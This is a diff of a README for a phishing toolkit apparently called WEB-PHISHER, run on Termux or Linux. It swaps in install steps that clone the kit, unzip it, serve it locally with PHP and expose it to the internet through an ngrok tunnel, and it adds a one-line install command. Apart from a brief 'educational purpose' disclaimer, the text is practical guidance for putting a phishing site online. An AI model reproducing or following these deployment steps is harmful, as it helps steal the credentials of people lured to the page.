@@ -18,24 +18,39 @@ This tool is only for educational purpose. If you use this tool for other purpos
 * storage 100 MB
 * ngrok Token
 
-## INSTALLATION [Termux] :
+## INSTALLATION [Termux OR Linux] :
 
 * `apt update`
 * `apt upgrade`
 * `pkg install git`
 * `pkg install zip`
 * `pkg install php`
-* `git clone https://github.com/noob-hackers/mrphish`
-* `cd $HOME`
+* `git clone https://github.com/phpmanickam/WEB-PHISHER.git`
+* `cd WEB-PHISHER`
 * `ls`
-* `cd mrphish`
+* `unzip WEB-PHISHER.zip`
 * `ls`
-* `bash setup`
-* `bash mrphish`
+* `php -S localhost:1234`
 ```
-[+]-- Open new session in termux and type tor
-[+]-- Open second session in termux and execute mrphish tool
+[+]-- Open new session in termux and start the ngrok server with 1234 port
+
+* `Now open ngrok website and crete a account `
+* `Download ngrok in your terminal`
+* `cd`
+* `./ngrok http 1234`
 ```
+## One line cammand 
+
+* pkg install git &&  pkg install php && pkg install zip && git clone https://github.com/phpmanickam/WEB-PHISHER.git && cd WEB-PHISHER && unzip WEB-PHISHER.zip && ls && php -S localhost:1234 
+
+[+]-- open another section
+
+* cd && ./ngrok http 1234
+
+
+
+
+
 
 
 
